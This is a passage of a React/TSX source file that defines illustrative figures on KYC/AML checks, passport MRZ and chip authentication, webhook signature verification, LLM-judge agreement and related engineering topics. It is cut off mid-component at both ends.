          {part}
        </span>
      ) : (
        <span key={i}>{part}</span>
      )
    );
  return (
    <Frame kicker="Before logs and LLM prompts" title="Typed placeholders keep the text readable">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 40px 1fr", fontFamily: mono, alignItems: "center" }}>
        {rows.map(([input, output, kind], i) => (
          <div key={i} style={{ display: "contents" }}>
            <div style={{ fontSize: 21, color: color.muted, padding: "17px 0", borderTop: `1px solid ${color.line}` }}>{input}</div>
            <div style={{ fontSize: 24, color: color.faint, borderTop: `1px solid ${color.line}`, padding: "15px 0", textAlign: "center" }}>→</div>
            <div
              style={{
                fontSize: kind === "kept" ? 20 : 21,
                color: kind === "kept" ? color.faint : color.ink,
                fontFamily: kind === "kept" ? sans : mono,
                padding: "17px 0",
                borderTop: `1px solid ${color.line}`,
              }}
            >
              {kind === "kept" ? output : mark(output)}
            </div>
          </div>
        ))}
      </div>
    </Frame>
  );
}

/* 15. LLM judge agreement ---------------------------------------------------------------------------------- */
export function FigJudgeKappa() {
  const bar = (y: number, label: string, raw: number, kappa: number) => (
    <g>
      <text x={0} y={y - 16} fill={color.ink} fontSize={25} fontFamily={sans}>
        {label}
      </text>
      <rect x={0} y={y} width={raw * 500} height={30} rx={4} fill={color.faint} />
      <text x={raw * 500 + 12} y={y + 24} fill={color.muted} fontSize={22} fontFamily={mono}>{`agreement ${raw.toFixed(2)}`}</text>
      <rect x={0} y={y + 40} width={Math.max(kappa * 500, 4)} height={30} rx={4} fill={kappa ? color.accent : color.warm} />
      <text
        x={Math.max(kappa * 500, 4) + 12}
        y={y + 64}
        fill={kappa ? color.accent : color.warm}
        fontSize={22}
        fontFamily={mono}
      >{`kappa ${kappa.toFixed(2)}`}</text>
    </g>
  );
  const cell = (x: number, y: number, n: number, good: boolean) => (
    <g>
      <rect x={x} y={y} width={150} height={110} rx={10} fill={good ? color.accentDim : color.warmDim} />
      <text x={x + 75} y={y + 70} fill={good ? color.accent : color.warm} fontSize={44} fontFamily={mono} textAnchor="middle">
        {n}
      </text>
    </g>
  );
  return (
    <Frame kicker="LLM-as-judge vs human grades · 100 answers, 90 pass" title="90% agreement can mean the judge is useless">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {bar(60, "Judge that passes everything", 0.9, 0)}
        {bar(230, "Judge with 94 of 100 right", 0.94, 0.69)}
        <text x={0} y={410} fill={color.muted} fontSize={22} fontFamily={sans}>
          Cohen's kappa removes the agreement you'd get by chance.
        </text>
        <text x={0} y={446} fill={color.muted} fontSize={22} fontFamily={sans}>
          0 = chance level, 1 = perfect.
        </text>
        <text x={1110} y={30} fill={color.ink} fontSize={24} fontFamily={sans} textAnchor="middle">
          The 0.69 judge's mistakes
        </text>
        <text x={1110} y={70} fill={color.muted} fontSize={20} fontFamily={mono} textAnchor="middle">
          judge: pass · fail
        </text>
        <text x={940} y={155} fill={color.muted} fontSize={20} fontFamily={mono} textAnchor="end">
          human pass
        </text>
        <text x={940} y={275} fill={color.muted} fontSize={20} fontFamily={mono} textAnchor="end">
          human fail
        </text>
        {cell(960, 90, 86, true)}
        {cell(1120, 90, 4, false)}
        {cell(960, 210, 2, false)}
        {cell(1120, 210, 8, true)}
        <text x={960} y={370} fill={color.warm} fontSize={21} fontFamily={sans}>
          2 of 10 real failures missed
        </text>
        <text x={960} y={402} fill={color.muted} fontSize={21} fontFamily={sans}>
          4 good answers flagged for review
        </text>
      </svg>
    </Frame>
  );
}

/* 16. Active liveness challenge-response ------------------------------------------------------------- */
export function FigActiveLiveness() {
  const rows: [string, string, string, boolean][] = [
    ["Live person", "turn left → look up → blink, ~1 s apart", "pass", true],
    ["Same request sent again", "nonce already used", "replay rejected", false],
    ["Pre-recorded video", "look up → turn left → blink", "wrong order", false],
    ["Synthetic stream", "all three actions within 150 ms", "faster than a person", false],
    ["Answer after 40 s", "challenge issued 40 s ago", "expired", false],
  ];
  return (
    <Frame
      kicker="Active liveness · challenge: turn left → look up → blink + one-time nonce"
      title="A random challenge stops replays, not a library of clips"
    >
      <div style={{ display: "grid", gridTemplateColumns: "330px 1fr 300px", fontFamily: sans }}>
        {rows.map(([who, what, verdict, ok]) => (
          <div key={who} style={{ display: "contents" }}>
            <div style={{ fontSize: 27, color: color.ink, padding: "18px 0", borderTop: `1px solid ${color.line}` }}>{who}</div>
            <div style={{ fontSize: 22, color: color.muted, fontFamily: mono, padding: "22px 0", borderTop: `1px solid ${color.line}` }}>{what}</div>
            <div
              style={{
                fontSize: 26,
                color: ok ? color.accent : color.warm,
                padding: "18px 0",
                borderTop: `1px solid ${color.line}`,
                textAlign: "right",
              }}
            >
              {ok ? "✓ " : "✗ "}
              {verdict}
            </div>
          </div>
        ))}
      </div>
      <div style={{ marginTop: 26, fontSize: 24, fontFamily: sans, color: color.ink }}>
        But 3 of 4 actions in order is only <span style={{ fontFamily: mono, color: color.warm }}>24</span> possible sequences: pair it with passive
        and injection checks.
      </div>
    </Frame>
  );
}

/* 17. AML structuring ------------------------------------------------------------------------------------ */
export function FigAmlStructuring() {
  const T = 10000;
  const y = (amt: number) => 330 - (amt / 16000) * 300;
  const panel = (x0: number, title: string, deps: [number, number][], flagged: string, tone: string) => (
    <g>
      <text x={x0} y={20} fill={tone} fontSize={26} fontFamily={sans}>
        {title}
      </text>
      <line x1={x0} x2={x0 + 400} y1={y(T)} y2={y(T)} stroke={color.ink} strokeWidth={2} strokeDasharray="8 8" />
      <line x1={x0} x2={x0 + 400} y1={330} y2={330} stroke={color.line} strokeWidth={2} />
      {deps.map(([day, amt], i) => (
        <g key={i}>
          <rect x={x0 + 10 + day * 12 + i * 50} y={y(amt)} width={26} height={330 - y(amt)} rx={4} fill={amt >= T ? color.faint : tone} />
          <text x={x0 + 23 + day * 12 + i * 50} y={360} fill={color.muted} fontSize={16} fontFamily={mono} textAnchor="middle">{`day ${day}`}</text>
        </g>
      ))}
      <text x={x0} y={410} fill={tone} fontSize={22} fontFamily={sans}>
        {flagged}
      </text>
    </g>
  );
  return (
    <Frame
      kicker="AML transaction monitoring · cash deposits vs a $10,000 reporting threshold"
      title="Structuring: deposits that stay just under the line"
    >
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {panel(
          0,
          "Customer A",
          [
            [0, 9500],
            [2, 9800],
            [5, 9200],
          ],
          "Alert: 3 in 5 days, $28,500",
          color.warm
        )}
        {panel(
          500,
          "Customer B",
          [
            [0, 9500],
            [10, 9800],
            [20, 9200],
          ],
          "No alert: spread over 20 days",
          color.accent
        )}
        {panel(
          1000,
          "Customer C",
          [
            [0, 12000],
            [1, 15000],
          ],
          "No alert: reported anyway",
          color.muted
        )}
        <text x={0} y={480} fill={color.ink} fontSize={22} fontFamily={sans}>
          Dashed line: the reporting threshold. The rule looks for 3+ cash deposits at 80–100% of it within 7 days.
        </text>
        <text x={0} y={520} fill={color.faint} fontSize={20} fontFamily={sans}>
          KYC knows who the customer is; monitoring like this is the rest of AML.
        </text>
      </svg>
    </Frame>
  );
}

/* 18. KYB ownership chain ----------------------------------------------------------------------------- */
export function FigKybOwnership() {
  const node = (x: number, y: number, label: string, kind: "company" | "person", note?: string, hot?: boolean) => (
    <g>
      <rect
        x={x - 110}
        y={y - 34}
        width={220}
        height={68}
        rx={kind === "company" ? 8 : 34}
        fill={hot ? color.warmDim : color.surface}
        stroke={hot ? color.warm : kind === "company" ? color.line : color.accent}
        strokeWidth={2}
      />
      <text x={x} y={y + 9} fill={color.ink} fontSize={25} fontFamily={sans} textAnchor="middle">
        {label}
      </text>
      {note && (
        <text x={x} y={y + 64} fill={hot ? color.warm : color.accent} fontSize={22} fontFamily={mono} textAnchor="middle">
          {note}
        </text>
      )}
    </g>
  );
  const edge = (x1: number, y1: number, x2: number, y2: number, pct: string) => (
    <g>
      <line x1={x1} y1={y1} x2={x2} y2={y2} stroke={color.faint} strokeWidth={2} />
      <text x={(x1 + x2) / 2 + 10} y={(y1 + y2) / 2} fill={color.muted} fontSize={21} fontFamily={mono}>
        {pct}
      </text>
    </g>
  );
  return (
    <Frame kicker="KYB · ultimate beneficial owners" title="15% on the register, 36% through the chain">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {edge(700, 74, 330, 166, "60%")}
        {edge(700, 74, 1140, 166, "25%")}
        {edge(760, 74, 900, 446, "")}
        <text x={796} y={170} fill={color.muted} fontSize={21} fontFamily={mono}>
          15% direct
        </text>
        {edge(330, 234, 150, 316, "50%")}
        {edge(330, 234, 520, 316, "50%")}
        {edge(520, 384, 300, 446, "30%")}
        {edge(560, 384, 820, 446, "70%")}
        {node(700, 40, "Target Ltd", "company")}
        {node(330, 200, "Holding A", "company")}
        {node(1140, 200, "Bilal", "person", "25%: a UBO in the US, not UK/EU")}
        {node(150, 350, "Omar", "person", "30%")}
        {node(520, 350, "Holding B", "company")}
        {node(300, 480, "Zainab", "person", "9%")}
        {node(900, 480, "Sara", "person", "", true)}
        <text x={1030} y={472} fill={color.warm} fontSize={24} fontFamily={mono}>
          15% + 60%×50%×70%
        </text>
        <text x={1030} y={506} fill={color.warm} fontSize={24} fontFamily={mono}>
          = 36%, the largest owner
        </text>
      </svg>
    </Frame>
  );
}

/* 19. KYC selfie match ------------------------------------------------------------------------------------ */
export function FigKycSelfieMatch() {
  const steps = ["Face found", "Face size", "Sharpness", "Brightness", "Similarity ≥ 0.80"];
  const outcomes: [string, string, string][] = [
    ["Same person", "similarity 0.951", "match"],
    ["Different person", "similarity −0.02", "human review"],
    ["Blurry selfie", "fails sharpness", "retry: “hold still”"],
    ["Face too small", "fails face size", "retry: “move closer”"],
  ];
  return (
    <Frame kicker="KYC selfie vs ID photo" title="Check the photo first, then compare the faces">
      <div style={{ display: "flex", alignItems: "center", gap: 14, fontFamily: sans }}>
        {steps.map((st, i) => (
          <div key={st} style={{ display: "flex", alignItems: "center", gap: 14 }}>
            <div
              style={{
                padding: "18px 22px",
                border: `1px solid ${i === 4 ? color.accent : color.line}`,
                borderRadius: 12,
                background: color.surface,
                fontSize: 24,
                color: color.ink,
              }}
            >
              {st}
            </div>
            {i < steps.length - 1 && <div style={{ fontSize: 30, color: color.faint }}>→</div>}
          </div>
        ))}
      </div>
      <div style={{ marginTop: 16, fontSize: 21, color: color.muted, fontFamily: sans }}>
        Quality gates (first four) send the user back with a reason; only good images reach the comparison.
      </div>
      <div style={{ marginTop: 30, display: "grid", gridTemplateColumns: "320px 320px 1fr", fontFamily: sans }}>
        {outcomes.map(([who, why, out]) => (
          <div key={who} style={{ display: "contents" }}>
            <div style={{ fontSize: 26, color: color.ink, padding: "16px 0", borderTop: `1px solid ${color.line}` }}>{who}</div>
            <div style={{ fontSize: 22, color: color.muted, fontFamily: mono, padding: "19px 0", borderTop: `1px solid ${color.line}` }}>{why}</div>
            <div
              style={{
                fontSize: 26,
                color: out === "match" ? color.accent : out.startsWith("retry") ? color.ink : color.warm,
                padding: "16px 0",
                borderTop: `1px solid ${color.line}`,
              }}
            >
              {out}
            </div>
          </div>
        ))}
      </div>
    </Frame>
  );
}

/* 20. CDD vs EDD ----------------------------------------------------------------------------------------- */
export function FigCddEdd() {
  const rows: [string, string, string, string][] = [
    ["Local salary account, branch", "0", "SDD", "no risk factors"],
    ["Remote, international transfers", "30", "CDD", "country +10 · transfers +15 · remote +5"],
    ["Crypto, high-risk country", "70", "EDD", "4 factors · source of funds missing"],
    ["Foreign minister's relative", "0", "EDD", "foreign PEP: mandatory, whatever the score"],
    ["Domestic official", "20", "CDD", "domestic PEP is a factor, not automatic"],
    ["Confirmed sanctions match", "–", "stop", "do not onboard; escalate"],
  ];
  const tone = (l: string) => (l === "SDD" ? color.accent : l === "CDD" ? color.ink : color.warm);
  return (
    <Frame kicker="Risk-based due diligence · SDD under 6 · CDD 6–39 · EDD 40+" title="The score picks the level; some facts override it">
      <div style={{ display: "grid", gridTemplateColumns: "460px 90px 110px 1fr", fontFamily: sans }}>
        {rows.map(([who, score, level, why]) => (
          <div key={who} style={{ display: "contents" }}>
            <div style={{ fontSize: 25, color: color.ink, padding: "15px 0", borderTop: `1px solid ${color.line}` }}>{who}</div>
            <div style={{ fontSize: 24, color: color.muted, fontFamily: mono, padding: "16px 0", borderTop: `1px solid ${color.line}` }}>{score}</div>
            <div style={{ fontSize: 25, color: tone(level), fontFamily: mono, padding: "15px 0", borderTop: `1px solid ${color.line}` }}>{level}</div>
            <div style={{ fontSize: 22, color: color.muted, padding: "17px 0", borderTop: `1px solid ${color.line}` }}>{why}</div>
          </div>
        ))}
      </div>
    </Frame>
  );
}

/* 21. Voice agent tool calls ------------------------------------------------------------------------------ */
export function FigVoiceToolCalls() {
  const ms = (t: number) => 260 + t * 0.26; // 1 ms = 0.26 px, 0–4000 ms
  const lane = (y: number, label: string, children: ReactNode) => (
    <g>
      <text x={240} y={y + 30} fill={color.ink} fontSize={23} fontFamily={sans} textAnchor="end">
        {label}
      </text>
      {children}
    </g>
  );
  return (
    <Frame kicker="Voice agent tool calls · 1.5 s budget per turn" title="Never leave the caller in silence">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        <line x1={ms(1500)} x2={ms(1500)} y1={20} y2={420} stroke={color.warm} strokeWidth={3} strokeDasharray="8 8" />
        <text x={ms(1500) + 10} y={36} fill={color.warm} fontSize={20} fontFamily={sans}>
          budget
        </text>
        {lane(
          70,
          "Fast tool (50 ms)",
          <>
            <rect x={ms(0)} y={70} width={50 * 0.26 + 6} height={44} rx={6} fill={color.accent} />
            <text x={ms(60) + 16} y={100} fill={color.ink} fontSize={21} fontFamily={sans}>
              answer in the same turn
            </text>
          </>
        )}
        {lane(
          170,
          "Slow tool (3 s)",
          <>
            <rect x={ms(0)} y={170} width={3000 * 0.26} height={44} rx={6} fill={color.surface} stroke={color.line} />
            <rect x={ms(1500) - 4} y={166} width={8} height={52} rx={2} fill={color.warm} />
            <text x={ms(1500) + 16} y={200} fill={color.ink} fontSize={20} fontFamily={sans}>
              holding line at 1.5 s
            </text>
            <text x={ms(3000) + 12} y={200} fill={color.accent} fontSize={20} fontFamily={sans}>
              result next turn
            </text>
          </>
        )}
        {lane(
          270,
          "Retry, same call ID",
          <>
            <rect x={ms(1800)} y={270} width={120} height={44} rx={6} fill={color.surface} stroke={color.line} />
            <text x={ms(1800) + 140} y={300} fill={color.ink} fontSize={20} fontFamily={sans}>
              "still checking": no second booking
            </text>
          </>
        )}
        {lane(
          370,
          "Bad signature",
          <>
            <rect x={ms(0)} y={370} width={40} height={44} rx={6} fill={color.warmDim} stroke={color.warm} />
            <text x={ms(0) + 60} y={400} fill={color.warm} fontSize={20} fontFamily={sans}>
              rejected before any tool runs
            </text>
          </>
        )}
        {[0, 1000, 2000, 3000, 4000].map((t) => (
          <text key={t} x={ms(t)} y={470} fill={color.faint} fontSize={20} fontFamily={mono} textAnchor="middle">
            {t / 1000} s
          </text>
        ))}
        <text x={260} y={530} fill={color.muted} fontSize={21} fontFamily={sans}>
          Tested: holding line returned at 1,501 ms; the booking ran once across three requests.
        </text>
      </svg>
    </Frame>
  );
}

/* 22. OCR metrics -------------------------------------------------------------------------------------------- */
export function FigOcrMetrics() {
  const bar = (y: number, label: string, value: number, text: string, tone: string, note: string) => (
    <g>
      <text x={0} y={y + 28} fill={color.ink} fontSize={25} fontFamily={sans}>
        {label}
      </text>
      <rect x={330} y={y} width={value * 700} height={40} rx={6} fill={tone} />
      <text x={330 + value * 700 + 14} y={y + 29} fill={tone} fontSize={25} fontFamily={mono}>
        {text}
      </text>
      <text x={330} y={y + 70} fill={color.muted} fontSize={19} fontFamily={sans}>
        {note}
      </text>
    </g>
  );
  return (
    <Frame kicker="One passport read, two misread characters (I→1, 0→O)" title="Same read, three very different scores">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {bar(10, "Character error rate", 0.05, "5%", color.accent, "2 wrong characters out of 40: looks excellent")}
        {bar(120, "Word error rate", 0.4, "40%", color.warm, "2 wrong words out of 5: looks terrible")}
        {bar(230, "Field accuracy", 0.8, "80%", color.ink, "4 of 5 fields right, but the wrong one is the document number")}
        <line x1={0} x2={1400} y1={350} y2={350} stroke={color.line} />
        <text x={0} y={400} fill={color.ink} fontSize={24} fontFamily={sans}>
          Normalise first: "Anna Maria" vs "ANNA MARIA" with a double space (case and spacing only)
        </text>
        <text x={0} y={442} fill={color.warm} fontSize={24} fontFamily={mono}>
          unnormalised CER 80%
        </text>
        <text x={360} y={442} fill={color.accent} fontSize={24} fontFamily={mono}>
          normalised CER 0%
        </text>
        <text x={0} y={496} fill={color.muted} fontSize={21} fontFamily={sans}>
          Urdu digits need explicit mapping: NFKC leaves "۳۵۲۰۲" ≠ "35202" (CER 100%).
        </text>
      </svg>
    </Frame>
  );
}

/* 23. MRZ fields ---------------------------------------------------------------------------------------------- */
export function FigMrzFields() {
  const CW = 30; // px per character at fontSize 50 mono
  const line = (y: number, segs: [string, string, string][]) => {
    let x = 0;
    return segs.map(([text, label, tone], i) => {
      const left = x;
      x += text.length * CW;
      return (
        <div key={y + "-" + i} style={{ position: "absolute", left, top: y, width: text.length * CW }}>
          <div style={{ fontFamily: mono, fontSize: 50, color: tone, letterSpacing: 0, width: text.length * CW, whiteSpace: "pre" }}>{text}</div>
          <div style={{ height: 4, margin: "4px 3px 0", background: tone, opacity: 0.8 }} />
          <div style={{ fontFamily: sans, fontSize: 18, color: color.muted, marginTop: 8, textAlign: "center", whiteSpace: "nowrap" }}>{label}</div>
        </div>
      );
    });
  };
  const A = color.accent,
    I = color.ink,
    W = color.warm,
    F = color.faint;
  return (
    <Frame kicker="ICAO 9303 TD3 specimen · 2 lines × 44 characters" title="Every passport MRZ field sits at a fixed position">
      <div style={{ position: "relative", height: 560, marginLeft: 40 }}>
        {line(10, [
          ["P<", "type", I],
          ["UTO", "issuer", A],
          ["ERIKSSON", "surname", I],
          ["<<", "", F],
          ["ANNA<MARIA", "given names", A],
          ["<".repeat(19), "filler", F],
        ])}
        {line(190, [
          ["L898902C3", "document no.", I],
          ["6", "✓", W],
          ["UTO", "nation", A],
          ["740812", "birth", I],
          ["2", "✓", W],
          ["F", "sex", A],
          ["120415", "expiry", I],
          ["9", "✓", W],
          ["ZE184226B<<<<<", "optional data", A],
          ["1", "✓", W],
          ["0", "all", W],
        ])}
        <div style={{ position: "absolute", top: 400, fontFamily: sans, fontSize: 25, color: color.ink }}>
          <span style={{ color: W }}>Orange</span> digits are check digits; the last one covers the document number, dates and optional data together.
        </div>
        <div style={{ position: "absolute", top: 450, fontFamily: sans, fontSize: 25, color: color.muted }}>
          Tested: both ICAO specimens pass every check; one misread (74O812) fails its own check and the composite.
        </div>
      </div>
    </Frame>
  );
}

/* 24. Webhook signatures ------------------------------------------------------------------------------------- */
export function FigWebhookSignatures() {
  const rows: [string, boolean, string][] = [
    ["Signed with the current secret", true, "accepted"],
    ["Signed with the old secret, during rotation", true, "accepted: both secrets configured"],
    ["Same request replayed 10 minutes later", false, "timestamp outside 300 s window"],
    ["Amount changed in transit", false, "signature mismatch"],
    ["Timestamp forged to look fresh", false, "signature mismatch: it covers the timestamp"],
    ["Body re-serialised, 10.50 → 10.5", false, "signature mismatch: verify the raw bytes"],
  ];
  return (
    <Frame kicker="HMAC-SHA256 over “timestamp.raw body” · 5-minute window" title="What a correct webhook verifier accepts">
      <div style={{ display: "grid", gridTemplateColumns: "640px 70px 1fr", fontFamily: sans }}>
        {rows.map(([req, ok, why]) => (
          <div key={req} style={{ display: "contents" }}>
            <div style={{ fontSize: 27, color: color.ink, padding: "17px 0", borderTop: `1px solid ${color.line}` }}>{req}</div>
            <div style={{ fontSize: 34, padding: "12px 0", borderTop: `1px solid ${color.line}` }}>{ok ? <Tick /> : <Cross />}</div>
            <div style={{ fontSize: 23, color: ok ? color.accent : color.warm, padding: "19px 0", borderTop: `1px solid ${color.line}` }}>{why}</div>
          </div>
        ))}
      </div>
    </Frame>
  );
}

/* 25. Partial JSON --------------------------------------------------------------------------------------------- */
export function FigPartialJson() {
  const rows: [string, string, string][] = [
    ["15", '{"title":"Refun', '{ title: "Refun" }'],
    ["30", '…"Refund policy","step', '{ title: "Refund policy" }'],
    ["60", '…["Open the order","Choose \\', '{ title, steps: ["Open the order", "Choose "] }'],
    ["119", '…"eligible":true,"notes":null}', "{ title, steps (2), days: 14, eligible: true, notes: null }"],
  ];
  return (
    <Frame kicker="Streaming structured output · 119-character response" title="Usable JSON at every point in the stream">
      <div style={{ display: "grid", gridTemplateColumns: "110px 560px 1fr", fontFamily: mono }}>
        <div style={{ fontFamily: sans, fontSize: 21, color: color.muted, paddingBottom: 12 }}>chars</div>
        <div style={{ fontFamily: sans, fontSize: 21, color: color.muted, paddingBottom: 12 }}>stream so far (invalid JSON)</div>
        <div style={{ fontFamily: sans, fontSize: 21, color: color.accent, paddingBottom: 12 }}>parsePartialJson returns</div>
        {rows.map(([n, raw, out]) => (
          <div key={n} style={{ display: "contents" }}>
            <div style={{ fontSize: 26, color: color.muted, padding: "22px 0", borderTop: `1px solid ${color.line}` }}>{n}</div>
            <div style={{ fontSize: 24, color: color.warm, padding: "23px 0", borderTop: `1px solid ${color.line}` }}>{raw}</div>
            <div style={{ fontSize: 24, color: color.ink, padding: "23px 16px", borderTop: `1px solid ${color.line}`, background: color.accentDim }}>
              {out}
            </div>
          </div>
        ))}
      </div>
      <div style={{ marginTop: 34, fontFamily: sans, fontSize: 24, color: color.muted }}>
        Tested: all 119 prefixes parse, and no key ever disappears once it has appeared.
      </div>
    </Frame>
  );
}

/* 26. Passport BAC keys ------------------------------------------------------------------------------------- */
export function FigPassportBacKeys() {
  const box = (label: string, value: string, tone: string) => (
    <div style={{ border: `1px solid ${color.line}`, borderRadius: 10, padding: "14px 20px", background: color.surface }}>
      <div style={{ fontFamily: sans, fontSize: 19, color: color.muted }}>{label}</div>
      <div style={{ fontFamily: mono, fontSize: 27, color: tone, marginTop: 6 }}>{value}</div>
    </div>
  );
  const arrow = (text: string) => <div style={{ fontFamily: sans, fontSize: 19, color: color.faint, padding: "6px 0 6px 24px" }}>↓ {text}</div>;
  return (
    <Frame kicker="Basic Access Control · ICAO Doc 9303 Part 11 worked example" title="From three MRZ fields to the keys that unlock the chip">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 40 }}>
        <div>
          {box("Document no. + check · birth date + check · expiry + check", "L898902C<3 6908061 9406236", color.ink)}
          {arrow("SHA-1, first 16 bytes")}
          {box("K_seed", "239AB9CB282DAF66231DC5A4DF6BFBAE", color.ink)}
          {arrow("SHA-1(K_seed ‖ counter), 16 bytes, odd parity")}
          <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 12 }}>
            {box("K_enc (counter 1)", "AB94FDECF2674FDFB9B391F85D7F76F2", color.accent)}
            {box("K_mac (counter 2)", "7962D9ECE03D1ACD4C76089DCE131543", color.accent)}
          </div>
        </div>
        <div style={{ fontFamily: sans, fontSize: 24, color: color.ink, lineHeight: 1.45 }}>
          <div style={{ color: color.accent, fontSize: 22, marginBottom: 10 }}>Matches ICAO's test values byte for byte</div>
          <div>The reader proves it holds the keys with EXTERNAL AUTHENTICATE; the keys are never sent.</div>
          <div style={{ marginTop: 22, color: color.warm }}>One misread character, C → O:</div>
          <div style={{ fontFamily: mono, fontSize: 24, color: color.warm, marginTop: 6 }}>K_enc E6A410DA4F438AFD…</div>
          <div style={{ marginTop: 10, color: color.muted, fontSize: 22 }}>
            Completely different key: the chip refuses, with no hint which field was wrong.
          </div>
        </div>
      </div>
    </Frame>
  );
}

/* 27. Similarity metrics ------------------------------------------------------------------------------------ */
export function FigSimilarityMetrics() {
  const bar = (y: number, label: string, value: number, tone: string) => (
    <g>
      <text x={0} y={y + 28} fill={color.ink} fontSize={24} fontFamily={sans}>
        {label}
      </text>
      <rect x={300} y={y} width={value * 700} height={40} rx={6} fill={tone} />
      <text x={300 + value * 700 + 14} y={y + 29} fill={tone} fontSize={24} fontFamily={mono}>
        {Math.round(value * 10)} of 10
      </text>
    </g>
  );
  return (
    <Frame kicker="10,000 vectors · 384 dimensions · overlap with cosine's top 10" title="Metrics only agree once vectors are normalised">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        <text x={0} y={20} fill={color.muted} fontSize={21} fontFamily={sans}>
          Unnormalised vectors (lengths vary 6×)
        </text>
        {bar(40, "Dot product", 0.5, color.warm)}
        {bar(100, "Euclidean distance", 0.1, color.warm)}
        <text x={0} y={210} fill={color.muted} fontSize={21} fontFamily={sans}>
          Normalised to length 1
        </text>
        {bar(230, "Dot product", 1, color.accent)}
        {bar(290, "Euclidean distance", 1, color.accent)}
        <line x1={0} x2={1400} y1={370} y2={370} stroke={color.line} />
        <text x={0} y={415} fill={color.ink} fontSize={23} fontFamily={sans}>
          Dot product favours long vectors: its top 10 average length 53.7, against 34.1 for all vectors.
        </text>
        <text x={0} y={460} fill={color.muted} fontSize={22} fontFamily={mono}>
          On unit vectors: ‖a − b‖² = 2 − 2·cos(a, b) (max error 1.3e-15)
        </text>
      </svg>
    </Frame>
  );
}

/* 28. Passive authentication ------------------------------------------------------------------------------ */
export function FigPassiveAuth() {
  const rows: [string, string, boolean][] = [
    ["Genuine passport", "all four checks pass", true],
    ["Name edited in DG1", "DG1 hash", false],
    ["…and the hash list rewritten", "messageDigest", false],
    ["…and the signed attributes rebuilt", "SOD signature", false],
    ["…and signed with a self-made DS certificate", "DS certificate chain", false],
    ["Genuine, but signature checked over the [0] tag", "SOD signature", false],
  ];
  return (
    <Frame kicker="Passive authentication · tested on a synthetic passport" title="Every forgery step is caught by a different check">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 420px", fontFamily: sans }}>
        <div style={{ fontSize: 21, color: color.muted, paddingBottom: 12 }}>What the chip data looks like</div>
        <div style={{ fontSize: 21, color: color.muted, paddingBottom: 12 }}>Check that fails</div>
        {rows.map(([what, check, ok]) => (
          <div key={what} style={{ display: "contents" }}>
            <div style={{ fontSize: 28, color: color.ink, padding: "17px 0", borderTop: `1px solid ${color.line}` }}>{what}</div>
            <div
              style={{
                fontFamily: mono,
                fontSize: 25,
                color: ok ? color.accent : color.warm,
                padding: "19px 16px",
                borderTop: `1px solid ${color.line}`,
                background: ok ? color.accentDim : "transparent",
              }}
            >
              {ok ? "✓ " : "✗ "}
              {check}
            </div>
          </div>
        ))}
      </div>
      <div style={{ marginTop: 28, fontFamily: sans, fontSize: 23, color: color.muted }}>
        The last row is a verifier bug: the signature covers the attributes re-tagged as a SET (0x31), not as stored (0xA0).
      </div>
    </Frame>
  );
}

/* 29. Vapi HMAC -------------------------------------------------------------------------------------------- */
export function FigVapiHmac() {
  const line = (label: string, text: string, tone: string) => (
    <div style={{ marginTop: 14 }}>
      <div style={{ fontFamily: sans, fontSize: 20, color: color.muted }}>{label}</div>
      <div style={{ fontFamily: mono, fontSize: 23, color: tone, marginTop: 6 }}>{text}</div>
    </div>
  );
  const rows: [string, boolean][] = [
    ["Valid signature, timestamp in seconds or ms", true],
    ["One byte of the body changed", false],
    ["Body re-serialised with JSON.stringify", false],
    ["Timestamp 6 minutes old (replay)", false],
    ["Missing or wrong-length signature", false],
  ];
  return (
    <Frame kicker="Vapi webhooks · HMAC-SHA256 over {timestamp}.{body}" title="Sign the raw bytes: parsed-then-stringified JSON fails">
      <div style={{ display: "grid", gridTemplateColumns: "1.15fr 1fr", gap: 48 }}>
        <div>
          {line("Raw body Vapi signed", '"cost":0.10,"summary":"Caf\\u00e9 …"', color.accent)}
          {line("JSON.stringify(JSON.parse(body))", '"cost":0.1,"summary":"Café …"', color.warm)}
          <div style={{ marginTop: 26, fontFamily: sans, fontSize: 23, color: color.ink, lineHeight: 1.45 }}>
            Same data, different bytes, so a different HMAC. Keep the raw buffer with <span style={{ fontFamily: mono }}>express.raw()</span> or a{" "}
            <span style={{ fontFamily: mono }}>verify</span> hook.
          </div>
        </div>
        <div style={{ fontFamily: sans }}>
          {rows.map(([what, ok]) => (
            <div
              key={what}
              style={{ display: "flex", gap: 14, fontSize: 25, color: color.ink, padding: "15px 0", borderTop: `1px solid ${color.line}` }}
            >
              <span style={{ color: ok ? color.accent : color.warm, fontWeight: 700 }}>{ok ? "✓" : "✗"}</span>
              {what}
            </div>
          ))}
          <div style={{ marginTop: 14, fontSize: 21, color: color.muted }}>7 of 7 tests pass, all checks constant-time.</div>
        </div>
      </div>
    </Frame>
  );
}

/* 30. Document approval ------------------------------------------------------------------------------------ */
export function FigApprovalFlow() {
  const rows: [string, string, string][] = [
    ["Sara submits rev-2", "in review · step 1 of 2", "rev-1"],
    ["Engineering approves step 1", "in review · step 2 of 2", "rev-1"],
    ["Maintenance approves step 2", "approved", "rev-2"],
  ];
  const refused: [string, string][] = [
    ["Sara approves her own revision", "403"],
    ["Maintenance decides step 1", "403"],
    ["Step 2 decided before step 1", "409"],
    ["Decision with a stale version", "409"],
    ["50 approvers race on one step", "1 × 200, 49 × 409"],
  ];
  return (
    <Frame kicker="Multi-step approval · Go · 5 tests, race detector on" title="The old revision stays effective until the last step approves">
      <div style={{ display: "grid", gridTemplateColumns: "1.25fr 1fr", gap: 48, fontFamily: sans }}>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 250px 120px" }}>
          <div style={{ fontSize: 20, color: color.muted, paddingBottom: 10 }}>Event</div>
          <div style={{ fontSize: 20, color: color.muted, paddingBottom: 10 }}>Review</div>
          <div style={{ fontSize: 20, color: color.accent, paddingBottom: 10 }}>Readers get</div>
          {rows.map(([e, r, eff]) => (
            <div key={e} style={{ display: "contents" }}>
              <div style={{ fontSize: 25, color: color.ink, padding: "16px 0", borderTop: `1px solid ${color.line}` }}>{e}</div>
              <div style={{ fontSize: 22, color: color.muted, padding: "18px 0", borderTop: `1px solid ${color.line}` }}>{r}</div>
              <div
                style={{
